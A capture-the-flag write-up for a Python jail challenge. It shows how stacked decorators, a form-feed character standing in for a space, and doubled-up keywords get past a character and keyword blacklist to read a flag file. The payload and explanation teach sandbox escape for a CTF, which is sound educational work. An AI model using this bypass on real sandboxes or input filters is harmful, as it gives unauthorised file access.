# Blacklisted
## Final Solution:

```python
>>> @pprintrint
>>> @sorted
>>> @oopenpen
>>> @input
>>> class^LX:pass
```
type in:
```
secret_folder/flag.txt
```
## Explanation

After looking at the blacklist string we realize that most of the things we could use for functions
are blacklisted. Even the space character isn't allowed!

`blacklist = "._0x6/|?*[]{}<>\"'=()\\\t "`

and

`blacklist2 = ['eval', 'exec', 'compile', 'import', 'os', 'sys', 'cat', 'ls', 'exit', 'list', 'max', 'min', 'set', 'tuple']`

You should notice that the @ character is allowed. Signifiying that we can use decorators to bypass the restrictions.

Python decorators work in the following way:

```python
@print
@input
class X:
    pass
```

is equivalent to:

```python
X = input(X)
X = print(X)
```

So we need someway to get the secret_folder/flag.txt file using just these decorators.
We know that the open function in python allows us to read in a file. 
So we can use the open decorator to read in the file specified by input.

This would look something like the following:

```python
@print
@open
@input
class X:
    pass
```

which is equivalent to:

```python
X = input(X)
X = open(X)
X = print(X)
```

A problem can be spotted when running this code, however, because the open function returns a file object, not the file contents. So we get something that looks like this:

```python
<_io.TextIOWrapper name='sample_file_name' mode='r' encoding='UTF-8'>
```

We need to get the contents of the file, not the file object. A file object is considered an iterable in python, so we can use a function that takes in an iterable. The sorted function does this. So we can use the sorted decorator to get the contents of the file.

```python
@print
@sorted
@open
@input
class X:
    pass
```

Running this code in a python file gives us file read access, but we notice that this code is not working in the interpreter. This is because of the blacklists. We aren't allowed to use spaces, in `class X:`. A simple fix for this is to use the formfeed character, which has similar properties to a space in python. This is allowed in the blacklist, so we can use it to bypass the space restriction. "" is the formfeed character.


Another thing we realize is that the `open` and `print` words are also blacklisted. This is an easy bypass as we can just replace them with `pprintrint` and `oopenpen` respectively. This works because `print` and `open` get substituted in for empty characters.

This gives us our final payload:

```python
@pprintrint
@sorted
@oopenpen
@input
class^LX:pass
```
Note ^L is the formfeed character.

Which when run, all we have to do is type in the flag file name and we get the flag returned to us as a list.

> bctf{w41t_h0w_d1d_y0u_d3c0r4t3_th4t?}


